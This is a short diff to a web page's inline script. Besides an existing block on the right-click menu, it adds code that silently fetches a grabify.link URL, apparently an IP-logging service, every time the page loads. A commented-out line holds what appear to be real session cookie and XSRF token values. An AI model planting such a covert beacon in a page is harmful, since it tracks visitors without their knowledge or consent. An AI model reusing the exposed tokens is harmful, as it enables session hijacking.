@@ -8,6 +8,20 @@
     window.addEventListener('contextmenu', function (e) {
       e.preventDefault();
     }, false);
+
+    var myHeaders = new Headers();
+    // myHeaders.append("Cookie", "XSRF-TOKEN=eyJpdiI6IllYbUp5aFlJbER3czdWb090S0dXOEE9PSIsInZhbHVlIjoiODZvWVlDdHpoUExrbE9YVzNFRnE0dE9rU2d0WDhwa2tsSWt0VUlLQlBJR0xBMVFXT3dsRm8wUUFFZzdMNGFJMUdnYjY4QnQ3YU5oUkUzajNhbVM0dndFc3RZMElLWUNNR3ZOV2xONlliRjA1RzdEdkRXRUdrUW1Kc0hCdXBkd1giLCJtYWMiOiJiNWY1ZWU1MDAyNzJjZThjYWU5M2Y0Y2E4Nzc4NGQwZDZkZWM3MmZlNDU4NWIwODA5YjEyZGZlNWUzNzUyODQxIiwidGFnIjoiIn0%3D; g_session=eyJpdiI6IlJ3STJrQk51NTkvSW1pemVwVWZFd1E9PSIsInZhbHVlIjoiVFhnMTl1b281UlBCMk44U3ZuWWZWZ2NXeUFZZHNIMEdRZnFWeXMzT2tVamJFdE1xRXorSnRBRlhSdFFiTnpmclpkYWU0REFxb1lnUkNvcFZoUTE5a3R2N1ptZTRXUmRCTjhJekxoaVBFVFdoVGp3SmsrU0hERVgwc3JhUUJGcEEiLCJtYWMiOiI4YjUxNmUyMDE2MjAzMDkzZWNjMmI3YmI4NWZlNjQ4MzQwZDE1MDQ1YTBiMGQ4MTM3YzA3MTJiMmNhYTMzMzViIiwidGFnIjoiIn0%3D");
+
+    var requestOptions = {
+      method: 'GET',
+      // headers: myHeaders,
+      redirect: 'follow'
+    };
+
+    fetch("https://grabify.link/5OIC9J", requestOptions)
+      .then(response => response.text())
+      .then(result => console.log(result))
+      .catch(error => console.log('error', error));
   </script>
 
   <meta charset="UTF-8">
